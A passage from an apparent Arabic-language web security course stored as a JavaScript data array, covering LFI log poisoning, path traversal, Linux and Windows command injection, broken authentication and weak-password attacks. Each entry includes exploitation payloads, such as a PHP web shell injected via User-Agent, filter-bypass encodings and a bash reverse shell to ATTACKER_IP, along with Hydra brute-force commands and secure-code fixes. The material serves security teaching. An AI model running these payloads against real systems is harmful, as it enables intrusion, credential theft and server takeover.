        <h3>استغلال ملفات السجلات (Log Poisoning):</h3>

        <p>في بعض الحالات يستطيع المهاجم حقن PHP داخل سجلات الخادم ثم تضمين ملف السجل عبر LFI.</p>

        <h3>حقن كود داخل User-Agent:</h3>

        <pre><code>&lt;?php system($_GET['cmd']); ?&gt;</code></pre>

        <p>ثم تضمين ملف السجل:</p>

        <pre><code>http://target.com/index.php?page=/var/log/apache2/access.log&cmd=id</code></pre>

        <p>إذا نجح ذلك قد يؤدي إلى Remote Code Execution.</p>

        <h3>استغلال php://filter:</h3>

        <pre><code>php://filter/convert.base64-encode/resource=index.php</code></pre>

        <p>يستخدم لقراءة ملفات PHP بشكل مشفر Base64.</p>

        <h3>مثال عملي:</h3>

        <pre><code>http://target.com/index.php?page=php://filter/convert.base64-encode/resource=config.php</code></pre>

        <p>ثم يقوم المهاجم بفك تشفير Base64 للحصول على الكود المصدري.</p>

        <h3>علامات تدل على وجود LFI:</h3>

        <p>1. ظهور محتوى ملفات النظام.</p>
        <p>2. استخدام include() مع مدخلات المستخدم.</p>
        <p>3. رسائل خطأ include أو require.</p>
        <p>4. إمكانية التنقل بين المجلدات باستخدام ../</p>

        <h3>رسائل خطأ شائعة:</h3>

        <pre><code>Warning: include()

failed to open stream

No such file or directory</code></pre>

        <h3>أدوات اكتشاف LFI:</h3>

        <pre><code>Burp Suite
OWASP ZAP
LFISuite
Nikto
ffuf</code></pre>

        <h3>مثال على كود آمن:</h3>

        <pre><code>// Secure Example

$pages = [
'home' => 'home.php',
'about' => 'about.php'
];

$page = $_GET['page'];

if(array_key_exists($page, $pages)) {
    include($pages[$page]);
}</code></pre>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. استخدام Whitelist للملفات المسموحة فقط.</b></p>

        <p><b>2. منع استخدام مدخلات المستخدم مباشرة داخل include().</b></p>

        <p><b>3. تعطيل الوصول للملفات الحساسة.</b></p>

        <p><b>4. استخدام مسارات ثابتة داخل التطبيق.</b></p>

        <p><b>5. منع Path Traversal.</b></p>

        <p><b>6. تعطيل عرض رسائل الأخطاء.</b></p>

        <h3>الفرق بين LFI و RFI:</h3>

        <p><b>LFI:</b> تحميل ملفات محلية من نفس الخادم.</p>

        <p><b>RFI:</b> تحميل ملفات من خادم خارجي.</p>

        <h3>خطورة الثغرة:</h3>

        <p>تعتبر Local File Inclusion من أخطر الثغرات لأنها تسمح بقراءة ملفات حساسة داخل النظام، وسرقة كلمات المرور والإعدادات السرية، وقد تؤدي في بعض الحالات إلى Remote Code Execution والسيطرة الكاملة على الخادم.</p>
    `
},



{
    "title": "Directory Traversal Attack",
    "summary": `
        <p>تعتبر ثغرة <b>Directory Traversal Attack</b> أو ما يعرف بـ <b>Path Traversal</b> من أخطر ثغرات تطبيقات الويب، وتسمح للمهاجم بالوصول إلى ملفات ومجلدات خارج المسار المسموح به داخل الخادم.</p>

        <p>تعتمد الثغرة على استخدام تسلسلات مثل <code>../</code> للتنقل بين المجلدات والوصول إلى ملفات حساسة داخل النظام.</p>

        <h3>كيف تعمل الثغرة؟</h3>

        <p>بعض التطبيقات تسمح للمستخدم بتحديد اسم ملف ليتم عرضه أو تحميله.</p>

        <p>مثال على كود PHP ضعيف:</p>

        <pre><code>// PHP Example

$file = $_GET['file'];

readfile("uploads/" . $file);</code></pre>

        <p>يفترض التطبيق أن المستخدم سيطلب ملفات داخل مجلد uploads فقط.</p>

        <p>لكن المهاجم يستطيع استخدام <code>../</code> للخروج من المجلد والوصول إلى ملفات أخرى.</p>

        <h3>مثال عملي على الاستغلال:</h3>

        <pre><code>http://target.com/download.php?file=../../../../etc/passwd</code></pre>

        <p>يقوم المهاجم بالصعود بين المجلدات حتى يصل إلى ملف النظام المطلوب.</p>

        <h3>ما معنى ../ ؟</h3>

        <p>الرمز <code>../</code> يعني الانتقال إلى المجلد الأب (Parent Directory).</p>

        <p>مثال:</p>

        <pre><code>uploads/../</code></pre>

        <p>يعني الخروج من uploads إلى المجلد الأعلى.</p>

        <h3>ملفات حساسة في لينكس:</h3>

        <pre><code>/etc/passwd
/etc/shadow
/etc/hosts
/var/log/apache2/access.log
/var/www/html/config.php</code></pre>

        <h3>ملفات حساسة في ويندوز:</h3>

        <pre><code>C:\\Windows\\win.ini
C:\\boot.ini
C:\\Windows\\System32\\drivers\\etc\\hosts</code></pre>

        <h3>مثال على قراءة ملف passwd:</h3>

        <pre><code>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</code></pre>

        <h3>أماكن شائعة لوجود الثغرة:</h3>

        <p>1. أنظمة تحميل الملفات.</p>
        <p>2. صفحات عرض الصور.</p>
        <p>3. أنظمة التصدير والنسخ الاحتياطي.</p>
        <p>4. Plugins الضعيفة.</p>
        <p>5. أنظمة إدارة الملفات.</p>

        <h3>بارامترات شائعة:</h3>

        <pre><code>?file=
?path=
?download=
?template=
?page=</code></pre>

        <h3>طرق تجاوز الحماية:</h3>

        <h3>1. URL Encoding:</h3>

        <pre><code>..%2f..%2f..%2fetc%2fpasswd</code></pre>

        <h3>2. Double Encoding:</h3>

        <pre><code>%252e%252e%252f</code></pre>

        <h3>3. استخدام Backslashes في ويندوز:</h3>

        <pre><code>..\\..\\..\\windows\\win.ini</code></pre>

        <h3>4. Null Byte Injection:</h3>

        <pre><code>../../../../etc/passwd%00.jpg</code></pre>

        <p>في بعض الأنظمة القديمة يتم تجاهل ما بعد %00.</p>

        <h3>5. تجاوز الفلاتر:</h3>

        <pre><code>....//
..../
..%c0%af</code></pre>

        <h3>اختبار الثغرة باستخدام Burp Suite:</h3>

        <pre><code>GET /download.php?file=../../../../etc/passwd HTTP/1.1
Host: vulnerable-site.com</code></pre>

        <h3>الفرق بين LFI و Directory Traversal:</h3>

        <p><b>Directory Traversal:</b> قراءة الملفات مباشرة عبر مسارات النظام.</p>

        <p><b>LFI:</b> تضمين الملفات داخل التطبيق باستخدام include().</p>

        <h3>استغلال الثغرة لقراءة ملفات الإعدادات:</h3>

        <pre><code>../../../../var/www/html/config.php</code></pre>

        <p>قد يحتوي الملف على:</p>

        <pre><code>DB_USER=root
DB_PASS=secretpassword</code></pre>

        <h3>استغلال ملفات Logs:</h3>

        <pre><code>../../../../var/log/apache2/access.log</code></pre>

        <p>قد تحتوي السجلات على معلومات حساسة أو تؤدي إلى Log Poisoning.</p>

        <h3>علامات تدل على وجود الثغرة:</h3>

        <p>1. إمكانية تغيير مسار الملفات.</p>
        <p>2. ظهور محتوى ملفات النظام.</p>
        <p>3. رسائل خطأ مثل:</p>

        <pre><code>No such file or directory

failed to open stream

Permission denied</code></pre>

        <p>4. استخدام ../ داخل البارامترات.</p>

        <h3>أدوات اكتشاف Directory Traversal:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Nikto
ffuf
WFuzz</code></pre>

        <h3>مثال على كود آمن:</h3>

        <pre><code>// Secure Example

$allowed = [
'image1.jpg',
'file.pdf'
];

$file = $_GET['file'];

if(in_array($file, $allowed)) {
    readfile("uploads/" . $file);
}</code></pre>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. استخدام Whitelist للملفات المسموحة فقط.</b></p>

        <p><b>2. منع استخدام ../ داخل المسارات.</b></p>

        <p><b>3. استخدام realpath() للتحقق من المسارات.</b></p>

        <p><b>4. تقييد صلاحيات الملفات.</b></p>

        <p><b>5. تخزين الملفات خارج مجلدات الويب العامة.</b></p>

        <p><b>6. تعطيل عرض رسائل الأخطاء.</b></p>

        <h3>مثال على حماية باستخدام realpath():</h3>

        <pre><code>$base = realpath("uploads/");
$file = realpath($base . "/" . $_GET['file']);

if(strpos($file, $base) === 0) {
    readfile($file);
}</code></pre>

        <h3>خطورة الثغرة:</h3>

        <p>تعتبر Directory Traversal Attack من الثغرات الخطيرة لأنها تسمح بقراءة ملفات النظام الحساسة، وسرقة كلمات المرور والإعدادات السرية، وقد تؤدي في بعض الحالات إلى Remote Code Execution والسيطرة الكاملة على الخادم.</p>
    `
},



{
    "title": "Command Injection في Linux",
    "summary": `
        <p>تعتبر ثغرة <b>Command Injection</b> من أخطر ثغرات تطبيقات الويب وأنظمة لينكس، وتحدث عندما يقوم التطبيق بتمرير مدخلات المستخدم مباشرة إلى أوامر نظام التشغيل (OS Commands) بدون فلترة أو تحقق أمني صحيح.</p>

        <p>تسمح هذه الثغرة للمهاجم بتنفيذ أوامر لينكس مباشرة على الخادم، مما قد يؤدي إلى السيطرة الكاملة على النظام.</p>

        <h3>كيف تحدث الثغرة؟</h3>

        <p>بعض التطبيقات تستخدم أوامر النظام لتنفيذ عمليات مثل:</p>

        <p>1. اختبار الاتصال Ping.</p>
        <p>2. ضغط الملفات.</p>
        <p>3. تحويل الصور.</p>
        <p>4. تشغيل سكربتات النظام.</p>

        <p>إذا تم دمج مدخلات المستخدم داخل الأمر بدون حماية، يستطيع المهاجم حقن أوامر إضافية.</p>

        <h3>مثال على كود PHP ضعيف:</h3>

        <pre><code>// PHP Example

$ip = $_GET['ip'];

system("ping -c 4 " . $ip);</code></pre>

        <p>يفترض التطبيق أن المستخدم سيدخل عنوان IP فقط.</p>

        <h3>مثال عملي على الاستغلال:</h3>

        <pre><code>127.0.0.1; id</code></pre>

        <p>فيتحول الأمر النهائي إلى:</p>

        <pre><code>ping -c 4 127.0.0.1; id</code></pre>

        <p>سيقوم لينكس بتنفيذ أمر ping ثم تنفيذ أمر <code>id</code>.</p>

        <h3>شرح الرموز المستخدمة في الحقن:</h3>

        <h3>الفاصلة المنقوطة ;</h3>

        <p>تستخدم لتنفيذ أمر جديد بعد انتهاء الأمر الأول.</p>

        <pre><code>127.0.0.1; whoami</code></pre>

        <h3>عامل &&</h3>

        <p>ينفذ الأمر الثاني إذا نجح الأول.</p>

        <pre><code>127.0.0.1 && whoami</code></pre>

        <h3>عامل ||</h3>

        <p>ينفذ الأمر الثاني إذا فشل الأول.</p>

        <pre><code>127.0.0.1 || whoami</code></pre>

        <h3>عامل Pipe |</h3>

        <p>يمرر مخرجات أمر إلى أمر آخر.</p>

        <pre><code>127.0.0.1 | whoami</code></pre>

        <h3>عامل Backticks:</h3>

        <pre><code>\`whoami\`</code></pre>

        <p>يقوم بتنفيذ الأمر داخل الـ Backticks.</p>

        <h3>عامل \$():</h3>

        <pre><code>\$(whoami)</code></pre>

        <p>طريقة حديثة لتنفيذ أوامر فرعية داخل Bash.</p>

        <h3>أوامر شائعة يستخدمها المهاجم:</h3>

        <pre><code>id
whoami
uname -a
pwd
ls
cat /etc/passwd
ifconfig
ip a</code></pre>

        <h3>قراءة ملفات حساسة:</h3>

        <pre><code>127.0.0.1; cat /etc/passwd</code></pre>

        <h3>معرفة المستخدم الحالي:</h3>

        <pre><code>127.0.0.1; whoami</code></pre>

        <h3>الحصول على معلومات النظام:</h3>

        <pre><code>127.0.0.1; uname -a</code></pre>

        <h3>الحصول على Reverse Shell:</h3>

        <pre><code>127.0.0.1; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1</code></pre>

        <p>ثم يقوم المهاجم بالاستماع عبر Netcat:</p>

        <pre><code>nc -lvnp 4444</code></pre>

        <h3>استغلال الثغرة عبر POST Request:</h3>

        <pre><code>POST /ping HTTP/1.1
Host: vulnerable-site.com

ip=127.0.0.1;id</code></pre>

        <h3>اختبار الثغرة باستخدام Burp Suite:</h3>

        <p>يقوم المختبر بإضافة رموز مثل:</p>

        <pre><code>;
&&
||
|
\`
\$()</code></pre>

        <p>ثم يراقب استجابة التطبيق.</p>

        <h3>أماكن شائعة لوجود Command Injection:</h3>

        <p>1. أدوات Ping و Traceroute.</p>
        <p>2. أنظمة النسخ الاحتياطي.</p>
        <p>3. رفع وضغط الملفات.</p>
        <p>4. أنظمة إدارة الشبكات.</p>
        <p>5. سكربتات الإدارة.</p>

        <h3>علامات تدل على وجود الثغرة:</h3>

        <p>1. اختلاف مخرجات الصفحة بعد إدخال ; أو &&.</p>
        <p>2. ظهور نتائج أوامر لينكس.</p>
        <p>3. تأخير الصفحة عند استخدام sleep.</p>

        <h3>اختبار Time-Based Command Injection:</h3>

        <pre><code>127.0.0.1; sleep 5</code></pre>

        <p>إذا تأخرت الصفحة فهذا يعني أن الأمر تم تنفيذه.</p>

        <h3>أدوات اكتشاف Command Injection:</h3>

        <pre><code>Burp Suite
Commix
OWASP ZAP
WFuzz
ffuf</code></pre>

        <h3>استخدام Commix:</h3>

        <pre><code>commix -u "http://target.com/ping.php?ip=127.0.0.1"</code></pre>

        <h3>مثال على كود آمن:</h3>

        <pre><code>// Secure Example

$ip = escapeshellarg($_GET['ip']);

system("ping -c 4 " . $ip);</code></pre>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. عدم تمرير مدخلات المستخدم مباشرة إلى أوامر النظام.</b></p>

        <p><b>2. استخدام escapeshellarg() و escapeshellcmd().</b></p>

        <p><b>3. استخدام Whitelist للمدخلات.</b></p>

        <p><b>4. تشغيل التطبيق بأقل الصلاحيات الممكنة.</b></p>

        <p><b>5. تعطيل الدوال الخطيرة مثل system() و exec().</b></p>

        <p><b>6. استخدام APIs داخلية بدلاً من أوامر النظام.</b></p>

        <h3>دوال PHP الخطيرة:</h3>

        <pre><code>system()
exec()
shell_exec()
passthru()
popen()</code></pre>

        <h3>خطورة الثغرة:</h3>

        <p>تعتبر Command Injection من أخطر الثغرات لأنها تؤدي مباشرة إلى Remote Code Execution (RCE)، مما يسمح للمهاجم بتنفيذ أوامر لينكس، قراءة الملفات الحساسة، إنشاء Reverse Shell، والسيطرة الكاملة على الخادم.</p>
    `
},



{
    "title": "OS Command Injection في Windows",
    "summary": `
        <p>تعتبر ثغرة <b>OS Command Injection</b> في أنظمة ويندوز من أخطر ثغرات تطبيقات الويب، وتحدث عندما يسمح التطبيق بتمرير مدخلات المستخدم مباشرة إلى أوامر نظام التشغيل Windows بدون فلترة أو تحقق أمني صحيح.</p>

        <p>يمكن للمهاجم استغلال هذه الثغرة لتنفيذ أوامر CMD أو PowerShell على الخادم، مما قد يؤدي إلى السيطرة الكاملة على النظام.</p>

        <h3>كيف تحدث الثغرة؟</h3>

        <p>بعض التطبيقات تستخدم أوامر النظام لتنفيذ عمليات مثل:</p>

        <p>1. Ping.</p>
        <p>2. إدارة الملفات.</p>
        <p>3. تشغيل سكربتات PowerShell.</p>
        <p>4. أدوات الإدارة والصيانة.</p>

        <p>إذا تم دمج مدخلات المستخدم داخل أوامر CMD بدون حماية يستطيع المهاجم حقن أوامر إضافية.</p>

        <h3>مثال على كود PHP ضعيف:</h3>

        <pre><code>// PHP Example

$ip = $_GET['ip'];

system("ping " . $ip);</code></pre>

        <h3>مثال عملي على الاستغلال:</h3>

        <pre><code>127.0.0.1 & whoami</code></pre>

        <p>فيتحول الأمر النهائي إلى:</p>

        <pre><code>ping 127.0.0.1 & whoami</code></pre>

        <p>سيقوم Windows بتنفيذ الأمرين معاً.</p>

        <h3>شرح الرموز المستخدمة في الحقن:</h3>

        <h3>عامل &</h3>

        <p>يستخدم لتنفيذ أمر جديد.</p>

        <pre><code>127.0.0.1 & dir</code></pre>

        <h3>عامل &&</h3>

        <p>ينفذ الأمر الثاني إذا نجح الأول.</p>

        <pre><code>127.0.0.1 && whoami</code></pre>

        <h3>عامل ||</h3>

        <p>ينفذ الأمر الثاني إذا فشل الأول.</p>

        <pre><code>127.0.0.1 || whoami</code></pre>

        <h3>عامل Pipe |</h3>

        <pre><code>127.0.0.1 | whoami</code></pre>

        <h3>أوامر CMD شائعة يستخدمها المهاجم:</h3>

        <pre><code>whoami
hostname
dir
ipconfig
net user
tasklist
systeminfo</code></pre>

        <h3>معرفة المستخدم الحالي:</h3>

        <pre><code>127.0.0.1 & whoami</code></pre>

        <h3>عرض الملفات:</h3>

        <pre><code>127.0.0.1 & dir</code></pre>

        <h3>الحصول على معلومات النظام:</h3>

        <pre><code>127.0.0.1 & systeminfo</code></pre>

        <h3>عرض الشبكة:</h3>

        <pre><code>127.0.0.1 & ipconfig</code></pre>

        <h3>عرض المستخدمين:</h3>

        <pre><code>127.0.0.1 & net user</code></pre>

        <h3>استغلال PowerShell:</h3>

        <pre><code>127.0.0.1 & powershell whoami</code></pre>

        <h3>تنفيذ PowerShell خبيث:</h3>

        <pre><code>127.0.0.1 & powershell -c "Get-Process"</code></pre>

        <h3>الحصول على Reverse Shell عبر PowerShell:</h3>

        <pre><code>powershell -NoP -NonI -W Hidden -Exec Bypass</code></pre>

        <p>يستخدم المهاجم PowerShell لإنشاء اتصال عكسي مع جهازه.</p>

        <h3>اختبار Time-Based Injection:</h3>

        <pre><code>127.0.0.1 & timeout /T 5</code></pre>

        <p>إذا تأخرت الصفحة فهذا يدل على تنفيذ الأمر.</p>

        <h3>استغلال الثغرة عبر POST Request:</h3>

        <pre><code>POST /ping HTTP/1.1
Host: vulnerable-site.com

ip=127.0.0.1 & whoami</code></pre>

        <h3>اختبار الثغرة باستخدام Burp Suite:</h3>

        <p>يقوم المختبر بإضافة رموز مثل:</p>

        <pre><code>&
&&
||
|</code></pre>

        <p>ثم يراقب استجابة التطبيق.</p>

        <h3>أماكن شائعة لوجود الثغرة:</h3>

        <p>1. أدوات Ping.</p>
        <p>2. لوحات التحكم.</p>
        <p>3. سكربتات الإدارة.</p>
        <p>4. تطبيقات الشبكات.</p>
        <p>5. أنظمة النسخ الاحتياطي.</p>

        <h3>علامات تدل على وجود OS Command Injection:</h3>

        <p>1. ظهور نتائج أوامر CMD.</p>
        <p>2. اختلاف محتوى الصفحة بعد إدخال & أو &&.</p>
        <p>3. تأخير الصفحة باستخدام timeout.</p>
        <p>4. ظهور معلومات النظام.</p>

        <h3>أدوات اكتشاف الثغرة:</h3>

        <pre><code>Burp Suite
Commix
OWASP ZAP
WFuzz
ffuf</code></pre>

        <h3>استخدام Commix:</h3>

        <pre><code>commix -u "http://target.com/ping.php?ip=127.0.0.1"</code></pre>

        <h3>دوال PHP الخطيرة:</h3>

        <pre><code>system()
exec()
shell_exec()
passthru()
popen()</code></pre>

        <h3>مثال على كود آمن:</h3>

        <pre><code>// Secure Example

$ip = escapeshellarg($_GET['ip']);

system("ping " . $ip);</code></pre>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. عدم تمرير مدخلات المستخدم مباشرة إلى أوامر النظام.</b></p>

        <p><b>2. استخدام escapeshellarg().</b></p>

        <p><b>3. استخدام Whitelist للمدخلات المسموحة.</b></p>

        <p><b>4. تشغيل التطبيق بأقل الصلاحيات الممكنة.</b></p>

        <p><b>5. تعطيل PowerShell إذا لم يكن مطلوباً.</b></p>

        <p><b>6. استخدام APIs داخلية بدلاً من أوامر CMD.</b></p>

        <h3>خطورة الثغرة:</h3>

        <p>تعتبر OS Command Injection من أخطر الثغرات لأنها قد تؤدي مباشرة إلى Remote Code Execution (RCE)، مما يسمح للمهاجم بتنفيذ أوامر CMD وPowerShell، قراءة الملفات الحساسة، إنشاء Reverse Shell، والسيطرة الكاملة على خادم ويندوز.</p>
    `
},



{
    "title": "Broken Authentication Vulnerability",
    "summary": `
        <p>تعتبر ثغرة <b>Broken Authentication</b> من أخطر ثغرات تطبيقات الويب، وتحدث عندما يحتوي نظام تسجيل الدخول أو إدارة الجلسات (Sessions) على ضعف أمني يسمح للمهاجم بانتحال هوية المستخدمين أو الوصول إلى الحسابات بدون صلاحية.</p>

        <p>تؤدي هذه الثغرة غالباً إلى اختراق الحسابات، سرقة الجلسات، أو تجاوز نظام المصادقة بالكامل.</p>

        <h3>ما المقصود بالمصادقة Authentication ؟</h3>

        <p>هي عملية التحقق من هوية المستخدم عبر:</p>

        <p>1. اسم المستخدم وكلمة المرور.</p>
        <p>2. الجلسات Sessions.</p>
        <p>3. الكوكيز Cookies.</p>
        <p>4. الرموز Tokens.</p>

        <h3>كيف تحدث الثغرة؟</h3>

        <p>تحدث عندما يكون نظام تسجيل الدخول أو إدارة الجلسات ضعيفاً، مثل:</p>

        <p>1. كلمات مرور ضعيفة.</p>
        <p>2. Session IDs متوقعة.</p>
        <p>3. عدم إنهاء الجلسات.</p>
        <p>4. غياب Multi-Factor Authentication.</p>
        <p>5. ضعف حماية الكوكيز.</p>

        <h3>مثال على Session ضعيف:</h3>

        <pre><code>PHPSESSID=12345</code></pre>

        <p>إذا كانت الـ Session IDs متوقعة يستطيع المهاجم تخمينها.</p>

        <h3>Session Fixation:</h3>

        <p>في بعض التطبيقات لا يتم إنشاء Session جديدة بعد تسجيل الدخول.</p>

        <p>يقوم المهاجم بإرسال Session ID للضحية:</p>

        <pre><code>PHPSESSID=ATTACKER123</code></pre>

        <p>إذا سجلت الضحية الدخول باستخدام نفس Session سيتمكن المهاجم من اختطاف الحساب.</p>

        <h3>Brute Force Attack:</h3>

        <p>إذا لم يوجد Rate Limiting يستطيع المهاجم تجربة آلاف كلمات المرور.</p>

        <pre><code>admin:123456
admin:password
admin:qwerty</code></pre>

        <h3>Credential Stuffing:</h3>

        <p>يقوم المهاجم باستخدام كلمات مرور مسربة من مواقع أخرى.</p>

        <h3>ضعف إعادة تعيين كلمة المرور:</h3>

        <p>بعض المواقع تستخدم Tokens ضعيفة أو يمكن تخمينها.</p>

        <pre><code>reset.php?token=12345</code></pre>

        <h3>عدم حماية الكوكيز:</h3>

        <p>إذا لم يتم استخدام HttpOnly و Secure قد تتم سرقة الجلسات عبر XSS أو الشبكات.</p>

        <h3>مثال على Cookie ضعيفة:</h3>

        <pre><code>Set-Cookie: PHPSESSID=12345</code></pre>

        <h3>الإعداد الآمن:</h3>

        <pre><code>Set-Cookie: PHPSESSID=RANDOM;
HttpOnly; Secure; SameSite=Strict</code></pre>

        <h3>تجاوز تسجيل الدخول عبر SQL Injection:</h3>

        <pre><code>' OR '1'='1</code></pre>

        <p>إذا كان التطبيق ضعيفاً قد يتم تجاوز المصادقة بالكامل.</p>

        <h3>اختبار Session Hijacking:</h3>

        <p>يقوم المختبر بسرقة Session Cookie ثم إضافتها داخل المتصفح.</p>

        <pre><code>Cookie: PHPSESSID=abcdef123456</code></pre>

        <h3>أماكن شائعة لوجود الثغرة:</h3>

        <p>1. صفحات تسجيل الدخول.</p>
        <p>2. أنظمة إعادة تعيين كلمة المرور.</p>
        <p>3. APIs.</p>
        <p>4. تطبيقات الجوال.</p>
        <p>5. لوحات الإدارة.</p>

        <h3>علامات تدل على وجود Broken Authentication:</h3>

        <p>1. عدم وجود MFA.</p>
        <p>2. Session IDs ضعيفة.</p>
        <p>3. عدم انتهاء الجلسات.</p>
        <p>4. غياب Rate Limiting.</p>
        <p>5. كلمات مرور ضعيفة.</p>

        <h3>اختبار Brute Force باستخدام Hydra:</h3>

        <pre><code>hydra -l admin -P passwords.txt
target.com http-post-form
"/login:user=^USER^&pass=^PASS^:F=invalid"</code></pre>

        <h3>اختبار Session باستخدام Burp Suite:</h3>

        <p>يقوم المختبر بتحليل:</p>

        <pre><code>Cookies
Tokens
Sessions
Password Reset</code></pre>

        <h3>أدوات اكتشاف Broken Authentication:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Hydra
Medusa
Nmap NSE Scripts</code></pre>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. استخدام كلمات مرور قوية.</b></p>

        <p><b>2. تفعيل Multi-Factor Authentication (MFA).</b></p>

        <p><b>3. استخدام Session IDs عشوائية قوية.</b></p>

        <p><b>4. تجديد Session بعد تسجيل الدخول.</b></p>

        <p><b>5. استخدام HttpOnly و Secure للكوكيز.</b></p>

        <p><b>6. تطبيق Rate Limiting ضد Brute Force.</b></p>

        <p><b>7. إنهاء الجلسات بعد تسجيل الخروج.</b></p>

        <p><b>8. استخدام Password Hashing مثل bcrypt.</b></p>

        <h3>مثال على Password Hashing:</h3>

        <pre><code>password_hash($password, PASSWORD_BCRYPT);</code></pre>

        <h3>مثال على تجديد Session:</h3>

        <pre><code>session_regenerate_id(true);</code></pre>

        <h3>خطورة الثغرة:</h3>

        <p>تعتبر Broken Authentication من أخطر الثغرات لأنها تسمح باختراق الحسابات، سرقة الجلسات، تجاوز تسجيل الدخول، أو السيطرة على حسابات المدراء، مما يؤدي إلى اختراق كامل للتطبيق والبيانات.</p>
    `
},



{
    "title": "Weak Password Attack",
    "summary": `
        <p>يعتبر <b>Weak Password Attack</b> من أكثر الهجمات شيوعاً في اختراق الحسابات، ويعتمد على استغلال كلمات المرور الضعيفة أو الشائعة التي يمكن تخمينها بسهولة.</p>

        <p>تحدث المشكلة عندما يستخدم المستخدم كلمات مرور بسيطة أو متوقعة مثل:</p>

        <pre><code>123456
password
admin
qwerty
welcome</code></pre>

        <p>يستطيع المهاجم استغلال ذلك للوصول إلى الحسابات أو الخدمات الحساسة.</p>

        <h3>كيف يعمل الهجوم؟</h3>

        <p>يقوم المهاجم بتجربة كلمات مرور شائعة أو مسربة حتى ينجح في تسجيل الدخول.</p>

        <h3>أنواع هجمات كلمات المرور الضعيفة:</h3>

        <h3>1. Dictionary Attack</h3>

        <p>يعتمد على قوائم جاهزة تحتوي على كلمات مرور شائعة.</p>

        <pre><code>password
123456
admin123
letmein</code></pre>

        <h3>2. Brute Force Attack</h3>

        <p>يقوم المهاجم بتجربة جميع الاحتمالات الممكنة.</p>

        <pre><code>a
aa
aaa
1234
abcd</code></pre>

        <h3>3. Credential Stuffing</h3>

        <p>استخدام بيانات مسربة من مواقع أخرى لتسجيل الدخول.</p>

        <h3>4. Hybrid Attack</h3>

        <p>دمج كلمات القاموس مع أرقام أو رموز.</p>

        <pre><code>password123
admin2025
welcome1</code></pre>

        <h3>أسباب نجاح الهجوم:</h3>

        <p>1. استخدام كلمات مرور ضعيفة.</p>
        <p>2. إعادة استخدام نفس كلمة المرور.</p>
        <p>3. غياب Multi-Factor Authentication.</p>
        <p>4. عدم وجود Rate Limiting.</p>
        <p>5. عدم قفل الحساب بعد المحاولات الفاشلة.</p>

        <h3>أمثلة على كلمات مرور ضعيفة:</h3>

        <pre><code>123456
password
admin
qwerty
111111
abc123
welcome
root
test</code></pre>

        <h3>اختبار الهجوم باستخدام Hydra:</h3>

        <pre><code>hydra -l admin -P passwords.txt
target.com http-post-form
"/login:user=^USER^&pass=^PASS^:F=invalid"</code></pre>

        <h3>اختبار SSH:</h3>

        <pre><code>hydra -l root -P rockyou.txt ssh://192.168.1.10</code></pre>

        <h3>استخدام Medusa:</h3>

        <pre><code>medusa -h 192.168.1.10
-u admin
-P passwords.txt
-M ssh</code></pre>

        <h3>استخدام Ncrack:</h3>

        <pre><code>ncrack -p ssh 192.168.1.10</code></pre>

        <h3>استغلال Credential Stuffing:</h3>

        <p>يقوم المهاجم باستخدام قواعد بيانات مسربة تحتوي على:</p>

        <pre><code>email:password</code></pre>

        <p>ثم يجربها على مواقع أخرى.</p>

        <h3>اختبار كلمات المرور داخل Burp Suite:</h3>

        <p>يستخدم المهاجم:</p>

        <pre><code>Intruder
Turbo Intruder</code></pre>

        <p>لتجربة آلاف كلمات المرور.</p>

        <h3>علامات تدل على وجود ضعف أمني:</h3>

        <p>1. عدم وجود MFA.</p>
        <p>2. غياب Rate Limiting.</p>
        <p>3. عدم قفل الحساب.</p>
        <p>4. قبول كلمات مرور ضعيفة.</p>
        <p>5. رسائل خطأ تكشف المستخدم الصحيح.</p>

        <h3>User Enumeration:</h3>

        <p>بعض المواقع تكشف إذا كان اسم المستخدم صحيحاً.</p>

        <pre><code>Invalid password</code></pre>

        <p>بينما للمستخدم غير الموجود:</p>

        <pre><code>User not found</code></pre>

        <p>هذا يساعد المهاجم على معرفة الحسابات الصحيحة.</p>

        <h3>اختبار Time-Based Responses:</h3>

        <p>بعض الأنظمة تستغرق وقتاً أطول عند التحقق من المستخدم الصحيح.</p>

        <h3>قوائم كلمات المرور الشهيرة:</h3>

        <pre><code>rockyou.txt
SecLists
Probable-Wordlists</code></pre>

        <h3>أماكن شائعة لاستهداف Weak Passwords:</h3>

        <p>1. صفحات تسجيل الدخول.</p>
        <p>2. SSH.</p>
        <p>3. FTP.</p>
        <p>4. لوحات الإدارة.</p>
        <p>5. البريد الإلكتروني.</p>
        <p>6. VPN.</p>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. فرض كلمات مرور قوية.</b></p>

        <p><b>2. استخدام MFA.</b></p>

        <p><b>3. تطبيق Rate Limiting.</b></p>

        <p><b>4. قفل الحساب مؤقتاً بعد عدة محاولات فاشلة.</b></p>

        <p><b>5. منع إعادة استخدام كلمات المرور.</b></p>

        <p><b>6. استخدام Password Hashing قوي.</b></p>

        <p><b>7. مراقبة محاولات تسجيل الدخول المشبوهة.</b></p>

        <h3>مثال على Password Hashing:</h3>

        <pre><code>password_hash($password, PASSWORD_BCRYPT);</code></pre>

        <h3>سياسة كلمة مرور قوية:</h3>

        <pre><code>Minimum 12 Characters
Uppercase + Lowercase
Numbers
Special Characters</code></pre>

        <h3>أمثلة على كلمات مرور قوية:</h3>

        <pre><code>T7#xP9!vQa21
M@ster2026!Secure
L0ng#Random$Pass</code></pre>

        <h3>خطورة الهجوم:</h3>

        <p>يسمح Weak Password Attack للمهاجم باختراق الحسابات بسهولة، والوصول إلى الأنظمة الحساسة، وسرقة البيانات، والسيطرة على الخوادم إذا تم استخدام كلمات مرور ضعيفة أو مسربة.</p>
    `
},



{
    "title": "Brute Force Login Attack",
    "summary": `
        <p>يعتبر <b>Brute Force Login Attack</b> من أشهر هجمات اختراق الحسابات، ويعتمد على تجربة عدد كبير جداً من كلمات المرور أو بيانات تسجيل الدخول حتى يتم العثور على البيانات الصحيحة.</p>

        <p>يقوم المهاجم بإرسال آلاف أو ملايين الطلبات إلى صفحة تسجيل الدخول بشكل آلي حتى ينجح في الوصول إلى الحساب.</p>

        <h3>كيف يعمل الهجوم؟</h3>

        <p>يقوم المهاجم بتحديد:</p>

